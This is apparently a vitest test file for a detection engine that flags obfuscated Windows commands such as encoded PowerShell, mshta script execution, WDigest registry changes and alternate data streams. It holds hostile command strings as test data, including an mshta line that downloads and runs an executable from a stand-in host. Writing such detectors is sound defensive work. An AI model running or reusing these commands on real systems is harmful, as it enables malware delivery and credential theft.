import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");

describe("Windows obfuscation threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- Positive cases ---

	it("detects -EncodedCommand (WIN-OBFUS-001)", () => {
		expect(
			matchCommand(engine, "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
		).toContain("CLT-WIN-OBFUS-001");
	});

	it("detects -enc shorthand (WIN-OBFUS-001)", () => {
		expect(matchCommand(engine, "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA")).toContain(
			"CLT-WIN-OBFUS-001",
		);
	});

	it("detects certutil -decode (WIN-OBFUS-002)", () => {
		expect(matchCommand(engine, "certutil -decode encoded.b64 output.exe")).toContain(
			"CLT-WIN-OBFUS-002",
		);
	});

	it("detects -WindowStyle Hidden (WIN-OBFUS-003)", () => {
		expect(matchCommand(engine, "powershell -WindowStyle Hidden -File script.ps1")).toContain(
			"CLT-WIN-OBFUS-003",
		);
	});

	it("detects -ExecutionPolicy Bypass -NoProfile (WIN-OBFUS-004)", () => {
		expect(
			matchCommand(engine, "powershell -ExecutionPolicy Bypass -NoProfile -File script.ps1"),
		).toContain("CLT-WIN-OBFUS-004");
	});

	it("detects [char] obfuscation (WIN-OBFUS-005)", () => {
		expect(matchCommand(engine, "[char]73+[char]69+[char]88 -join ''")).toContain(
			"CLT-WIN-OBFUS-005",
		);
	});

	it("detects SecurityProviders registry path (WIN-OBFUS-006)", () => {
		expect(
			matchCommand(
				engine,
				"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1",
			),
		).toContain("CLT-WIN-OBFUS-006");
	});

	// --- Negative cases ---

	it("does not match normal powershell -File", () => {
		const ids = matchCommand(engine, "powershell -File script.ps1");
		expect(ids.filter((id) => id.startsWith("CLT-WIN-OBFUS"))).toEqual([]);
	});

	it("does not match certutil -verify", () => {
		const ids = matchCommand(engine, "certutil -verify cert.pem");
		expect(ids.filter((id) => id.startsWith("CLT-WIN-OBFUS"))).toEqual([]);
	});

	it("does not match short base64 string", () => {
		const ids = matchCommand(engine, "powershell -enc abc");
		expect(ids.filter((id) => id === "CLT-WIN-OBFUS-001")).toEqual([]);
	});

	// --- mshta VBScript execution (OBFUS-007 — broadened) ---

	it("detects mshta vbscript:Execute (WIN-OBFUS-007)", () => {
		expect(matchCommand(engine, 'mshta vbscript:Execute("MsgBox 1")')).toContain(
			"CLT-WIN-OBFUS-007",
		);
	});

	it("detects mshta vbscript:CreateObject (WIN-OBFUS-007)", () => {
		expect(
			matchCommand(
				engine,
				'mshta.exe vbscript:CreateObject("WScript.Shell").Run("cmd /c curl http://evil.test/a.exe --output C:\\Users\\Public\\a.exe & start C:\\Users\\Public\\a.exe",0)(Window.Close)',
			),
		).toContain("CLT-WIN-OBFUS-007");
	});

	it("detects mshta vbscript:close(CreateObject (WIN-OBFUS-007)", () => {
		expect(
			matchCommand(
				engine,
				'MSHTA vbscript:close(CreateObject("WScript.Shell").Run("powershell.exe ...",0,False))',
			),
		).toContain("CLT-WIN-OBFUS-007");
	});

	it("does not match mshta with normal HTA file (WIN-OBFUS-007 neg)", () => {
		const ids = matchCommand(engine, "mshta C:\\app\\dialog.hta");
		expect(ids.filter((id) => id === "CLT-WIN-OBFUS-007")).toEqual([]);
	});

	// --- mshta javascript: execution (OBFUS-008) ---

	it("detects mshta javascript:eval (WIN-OBFUS-008)", () => {
		expect(
			matchCommand(
				engine,
				'mshta.exe javascript:eval(\'w=new%20ActiveXObject("WScript.Shell");w.run("explorer malware");window.close()\')',
			),
		).toContain("CLT-WIN-OBFUS-008");
	});

	it("detects MSHTA javascript: case-insensitive (WIN-OBFUS-008)", () => {
		expect(
			matchCommand(engine, 'MSHTA javascript:document.write("<script>alert(1)</script>")'),
		).toContain("CLT-WIN-OBFUS-008");
	});

	it("does not match mshta with file path (WIN-OBFUS-008 neg)", () => {
		const ids = matchCommand(engine, "mshta C:\\SearcherBar\\run.hta");
		expect(ids.filter((id) => id === "CLT-WIN-OBFUS-008")).toEqual([]);
	});

	// --- wscript/cscript //E: engine override (OBFUS-009) ---

	it("detects wscript //E:VBScript on .mdb file (WIN-OBFUS-009)", () => {
		expect(
			matchCommand(engine, 'wscript.exe //E:VBScript "C:\\Users\\HELLO\\Documents\\database.mdb"'),
		).toContain("CLT-WIN-OBFUS-009");
	});

	it("detects wscript //E:vbscript on extensionless file (WIN-OBFUS-009)", () => {
		expect(
			matchCommand(
				engine,
				'wscript.exe //E:vbscript "C:\\Users\\jaja\\AppData\\Roaming\\MSShell32" c4bbf69c54',
			),
		).toContain("CLT-WIN-OBFUS-009");
	});

	it("detects cscript //E:JScript (WIN-OBFUS-009)", () => {
		expect(matchCommand(engine, "cscript //E:JScript C:\\ProgramData\\Loader")).toContain(
			"CLT-WIN-OBFUS-009",
		);
	});

	it("does not match normal wscript .vbs execution (WIN-OBFUS-009 neg)", () => {
		const ids = matchCommand(engine, 'wscript.exe "C:\\scripts\\test.vbs"');
		expect(ids.filter((id) => id === "CLT-WIN-OBFUS-009")).toEqual([]);
	});

	// --- Rules moved from yara_techniques.yaml ---

	it("detects NTFS $INDEX_ALLOCATION (WIN-OBFUS-010)", () => {
		expect(matchCommand(engine, "echo test > file.txt::$INDEX_ALLOCATION")).toContain(
			"CLT-WIN-OBFUS-010",
		);
	});

	it("detects ADS bypass via type redirect (WIN-OBFUS-011)", () => {
		expect(matchCommand(engine, "type payload.exe > legit.txt:hidden.exe")).toContain(
			"CLT-WIN-OBFUS-011",
		);
	});

	it("detects dotdotdot folder creation (WIN-OBFUS-012)", () => {
		expect(matchCommand(engine, "mkdir ...")).toContain("CLT-WIN-OBFUS-012");
	});

	it("detects cmd caret obfuscation (WIN-OBFUS-013)", () => {
		expect(matchCommand(engine, "cmd /c p^o^w^e^r^s^h^e^l^l")).toContain("CLT-WIN-OBFUS-013");
	});

	it("detects cmd substring concat obfuscation (WIN-OBFUS-014)", () => {
		expect(matchCommand(engine, "cmd /c %comspec:~0,1%%comspec:~4,1%")).toContain(
			"CLT-WIN-OBFUS-014",
		);
	});

	it("detects powershell backtick obfuscation (WIN-OBFUS-015)", () => {
		expect(matchCommand(engine, "powershell I`n`v`o`k`e-Expression")).toContain(
			"CLT-WIN-OBFUS-015",
		);
	});

	it("detects powershell XOR decryption (WIN-OBFUS-016)", () => {
		expect(matchCommand(engine, "powershell $data -bxor 'key'")).toContain("CLT-WIN-OBFUS-016");
	});

	// --- Additional FP coverage ---

	it("does not match powershell -WindowStyle Normal (003 FP)", () => {
		const ids = matchCommand(engine, "powershell -WindowStyle Normal -File script.ps1");
		expect(ids).not.toContain("CLT-WIN-OBFUS-003");
	});

	it("does not match -ExecutionPolicy Bypass without -NoProfile (004 FP)", () => {
		const ids = matchCommand(engine, "powershell -ExecutionPolicy Bypass -File script.ps1");
		expect(ids).not.toContain("CLT-WIN-OBFUS-004");
	});

	it("does not match normal [char] cast without -join (005 FP)", () => {
		const ids = matchCommand(engine, "[char]65");
		expect(ids).not.toContain("CLT-WIN-OBFUS-005");
	});

	it("does not match NTFS path with normal colon (010 FP)", () => {
		const ids = matchCommand(engine, "echo test > C:\\output.txt");
		expect(ids).not.toContain("CLT-WIN-OBFUS-010");
	});

	it("does not match type to normal file (011 FP)", () => {
		const ids = matchCommand(engine, "type readme.txt > output.txt");
		expect(ids).not.toContain("CLT-WIN-OBFUS-011");
	});

	it("does not match mkdir with normal name (012 FP)", () => {
		const ids = matchCommand(engine, "mkdir myproject");
		expect(ids).not.toContain("CLT-WIN-OBFUS-012");
	});

	it("does not match cmd without caret obfuscation (013 FP)", () => {
		const ids = matchCommand(engine, "cmd /c echo hello world");
		expect(ids).not.toContain("CLT-WIN-OBFUS-013");
	});

	it("does not match powershell with normal backtick newline (015 FP)", () => {
		const ids = matchCommand(engine, "powershell Write-Host `n");
		expect(ids).not.toContain("CLT-WIN-OBFUS-015");
	});

	it("does not match powershell numeric XOR (016 FP)", () => {
		const ids = matchCommand(engine, "powershell $result = 0xFF -bxor 0x0F");
		expect(ids).not.toContain("CLT-WIN-OBFUS-016");
	});
});
